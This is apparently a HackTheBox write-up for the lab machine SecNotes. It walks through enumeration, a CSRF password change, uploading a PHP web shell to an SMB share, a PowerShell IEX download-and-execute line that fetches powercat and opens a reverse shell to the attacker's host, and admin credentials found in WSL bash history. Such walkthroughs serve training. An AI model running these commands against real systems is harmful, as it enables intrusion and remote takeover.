---
title: HackTheBox - Secnotes
description: SecNotes is a medium difficulty machine, which highlights the risks associated with weak password change mechanisms, lack of CSRF protection and insufficient validation of user input. It also teaches about Windows Subsystem for Linux enumeration. 
date: 2024-04-30 11:50:00 +0530
categories: [HackTheBox]
tags: [hackthebox, Medium]
image:
  path: /assets/img/headers/htb_secnotes.webp
---

## Enumeration
Spawning the machine and adding the IP to `/etc/hosts` as *secnotes.htb*. First i will try to do basic scan of all the open ports and then do advanced scan on the open ports, using nmap.

### Nmap

```console
$ sudo nmap -p- secnotes.htb 
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 06:58 EDT
Nmap scan report for secnotes.htb (10.10.10.97)
Host is up (0.044s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
8808/tcp open  ssports-bcast

Nmap done: 1 IP address (1 host up) scanned in 152.67 seconds

$ sudo nmap -p80,445,8808 -sC -sV secnotes.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-31 07:08 EDT
Nmap scan report for secnotes.htb (10.10.10.97)
Host is up (0.054s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  s       Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m01s, deviation: 4h02m31s, median: 0s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-07-31T04:08:47-07:00
| smb2-time: 
|   date: 2023-07-31T11:08:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.31 seconds
```

Browsing to http://secnotes.htb:80/ we see a login page. We can login or signup. I signed up with a username and password of my choice.  Then, i try to login with my creds to see the home page.

![secnotes](/assets/img/htb_secnotes/Secnotes-001.png)

The functionalities of above four buttons are as follows.
1. New note - Creates a new note and display the new note on this home page. I tried XSS on this page and it worked.
![secnotes](/assets/img/htb_secnotes/Secnotes-002.png)
3. changes the password and returns to `/home`. although it does not ask for current password. I have captured this request and we could send the post body in url parameters. it would still work.
4. We could browse to `http://secnotes.htb/change_pass.php?password=dinesh&confirm_password=dinesh&submit=submit` to change password without current password.
![secnotes](/assets/img/htb_secnotes/Secnotes-003.png)
1. sign out - just redirects to `/login.php`
2. contact us - we can send a message to user tyler@secnotes.htb

![secnotes](/assets/img/htb_secnotes/Secnotes-004.png)

We can simply send our ipv4 address and receive a ping on our netcat

![secnotes](/assets/img/htb_secnotes/Secnotes-005.png)

## Foothold

### XSRF

the content posted in contact us page, is being reached at. so we can do CSRF attack, by using contact us page to send a request to change its password.

![secnotes](/assets/img/htb_secnotes/Secnotes-006.png)

Now that we have changed tylers password to our liking, we could login as tyler.

![secnotes](/assets/img/htb_secnotes/Secnotes-007.png)

After logging in, one the notes has the smb creds for tyler.

![secnotes](/assets/img/htb_secnotes/Secnotes-008.png)

```txt
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

Let us try to login using *smbmap*.

```console
$ smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H secnotes.htb
[+] IP: secnotes.htb:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
```

### Reverse shell

After logging in, lets put in PHP cmd shell in the share and try to browse it at http://secnotes:8808/cmd-rev.php . You could use revshells.com to generate this php.


[revshells.com](https://www.revshells.com/)
![secnotes](/assets/img/htb_secnotes/Secnotes-009.png)

```console
$ smbclient //secnotes.htb/new-site --user=tyler --password='92g!mA8BGjOirkL%OG*&'
Try "help" to get a list of possible commands.
smb: \> put cmd-rev.php
```

You could execute windows commands over this shell.

![secnotes](/assets/img/htb_secnotes/Secnotes-010.png)

You can use this shell to get a reverse-shell using powercat.ps1 which is hosted with python. and start a netcat listener for the reverse shell.

![powercat.ps1](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

```bash
python -m http.server 
nc -lnvp 4444
```

```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.8:8000/powercat.ps1');
powercat -c 10.10.14.8 -p 4444 -e powershell"
```

As we got tyler's user shell, we could read user.txt

```powershell
$ PS C:\users\tyler\desktop> type user.txt 
type user.txt
1da84f263e2a63d52cf47141c5588664
```

## Privilege Escalation

On **tyler**'s desktop folder, you could see `bash.lnk`. When we see the contents of `bash.lnk`, we could see the partial location of `bash.exe`, but to find full path to bash.exe, let us use a powershell command to find it.

![secnotes](/assets/img/htb_secnotes/Secnotes-011.png)

```powershell
Get-ChildItem -Path "C:\" -Filter "bash.exe" -Recurse -File

Directory: C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/21/2018   3:02 PM         115712 bash.exe
```

### Windows Subsytem for Linux

```powershell
PS C:\users\tyler\desktop> C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
Cmesg: ttyname failed: :\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
Inappropriate ioctl for device
```

We can upgrade the current shell using python. and check the history if we can gather some info.

```bash
$ whoami
-bash: line 1: $'whoami\r': command not found
$ which python
python -c 'import pty;pty.spawn("/bin/bash")'
$ root@SECNOTES:~# dir
dir
filesystem
$ root@SECNOTES:~# 
$ root@SECNOTES:~# history
history
    1  cd /mnt/c/
    2  ls
    3  cd Users/
    4  cd /
    5  cd ~
    6  ls
    7  pwd
    8  mkdir filesystem
    9  mount //127.0.0.1/c$ filesystem/
   10  sudo apt install cifs-utils
   11  mount //127.0.0.1/c$ filesystem/
   12  mount //127.0.0.1/c$ filesystem/ -o user=administrator
   13  cat /proc/filesystems
   14  sudo modprobe cifs
   15  smbclient
   16  apt install smbclient
   17  smbclient
   18  smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
   19  > .bash_history 
   20  less .bash_history
   21  dir
   22  history
root@SECNOTES:~# 
root@SECNOTES:~# 

```
We just got the admin credentials in the history.

You could use smbclient to connect C$ and get the **root.txt** or use `winexe` to get admin shell.

```bash
$ smbclient //secnotes.htb/C$ --user=administrator --password='u6!4ZwgwOM#^OBf#Nwnh'
get root.txt
```
or

`$ winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe`


